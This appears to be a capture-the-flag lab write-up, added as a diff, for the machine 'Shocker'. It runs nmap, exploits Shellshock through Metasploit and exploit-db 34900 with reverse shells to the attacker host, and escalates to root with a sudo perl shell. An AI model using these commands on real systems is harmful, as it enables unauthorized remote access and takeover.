@@ -1,0 +1,139 @@
+Machine-Name  :  Shocker
+IP-Address    :  10.129.94.199
+
+Command-Line: sudo nmap -A 10.129.94.199
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 03:06 EST
+    Nmap scan report for 10.129.94.199
+    Host is up (0.052s latency).
+    Not shown: 998 closed ports
+    PORT     STATE SERVICE VERSION
+    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Site doesn't have a title (text/html).
+    2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+    |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=2/3%OT=80%CT=1%CU=30145%PV=Y%DS=2%DC=T%G=Y%TM=601A59B5
+    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(
+    OS:O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11
+    OS:NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+    OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+    OS:S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 1723/tcp)
+    HOP RTT      ADDRESS
+    1   54.15 ms 10.10.14.1
+    2   54.58 ms 10.129.94.199
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 21.45 seconds
+
+
+
+
+
+*** METASPLOIT METHOD ***
+
+    Command-Line: msfconsole
+
+    msf6: search cgi bash
+    Result:
+        Matching Modules
+        ================
+
+           #  Name                                               Disclosure Date  Rank       Check  Description
+           -  ----                                               ---------------  ----       -----  -----------
+           0  auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+           1  exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
+           2  exploit/multi/fileformat/evince_cbt_cmd_injection  2017-07-13       excellent  No     Evince CBT File Command Injection
+           3  exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+           4  exploit/unix/ssh/arista_tacplus_shell              2020-02-02       great      Yes    Arista restricted shell escape (with privesc)
+
+
+    msf6: use 3
+    msf6: set rhosts 10.129.94.199
+    msf6: set targeturi /cgi/user.sh
+    msf6: set lhost 10.10.14.149
+    msf6: run
+    Result:
+        [*] Started reverse TCP handler on 10.10.14.149:4444
+        [*] Command Stager progress - 100.46% done (1097/1092 bytes)
+        [*] Sending stage (976712 bytes) to 10.129.94.199
+        [*] Meterpreter session 2 opened (10.10.14.149:4444 -> 10.129.94.199:39522) at 2021-02-03 04:08:41 -0500
+
+    meterpreter > ls
+        Listing: /usr/lib/cgi-bin
+        =========================
+
+        Mode              Size  Type  Last modified              Name
+        ----              ----  ----  -------------              ----
+        100755/rwxr-xr-x  113   fil   2017-09-22 15:29:26 -0400  user.sh
+
+    meterpreter > pwd
+        /usr/lib/cgi-bin
+
+    meterpreter > cat /home/shelly/user.txt
+    Result: 27858595b5ea358b349d5e28c8c4b066
+        *** USER OWNED ***
+
+
+Attempting root access...
+
+Notes: Downloaded exploit:
+URL: https://www.exploit-db.com/exploits/34900
+Result: /34900.py
+
+Notes:
+Shellshock apache mod_cgi remote exploit
+
+Usage:
+    ./exploit.py var=<value>
+
+    Vars:
+    rhost: victim host
+    rport: victim port for TCP shell binding
+    lhost: attacker host for TCP shell reversing
+    lport: attacker port for TCP shell reversing
+    pages:  specific cgi vulnerable pages (separated by comma)
+    proxy: host:port proxy
+
+    Payloads:
+    "reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
+    "bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)
+
+    Example:
+
+    ./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
+    ./exploit.py payload=bind rhost=1.2.3.4 rport=1234
+
+
+Command-Line: chmod 744 34900.py
+Command-Line: python 34900.py rhost=10.129.94.199 rport=80 lhost=10.10.14.149 lport=9001 pages=/cgi-bin/user.sh payload=reverse
+Result:
+    [!] Started reverse shell handler
+    [-] Trying exploit on : /cgi-bin/user.sh
+    [!] Successfully exploited
+    [!] Incoming connection from 10.129.94.199
+    10.129.94.199> whoami
+    shelly
+    *** USER ACCESS ***
+
+10.129.94.199> sudo /usr/bin/perl -e 'exec "/bin/sh"'
+Result: 90b263e83927fb9023b76caf88af06d0
+    *** ROOT ACCESS ***
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
